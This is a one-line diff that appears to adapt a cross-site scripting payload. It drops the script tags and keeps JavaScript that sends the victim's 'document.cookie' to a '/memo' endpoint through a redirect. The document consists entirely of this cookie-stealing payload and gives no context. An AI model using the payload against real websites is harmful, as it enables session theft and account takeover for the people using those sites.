@@ -1,1 +1,1 @@
-<script type="text/javascript">document.location="/memo?memo="+document.cookie;</script>
+document.location="/memo?memo="+document.cookie;
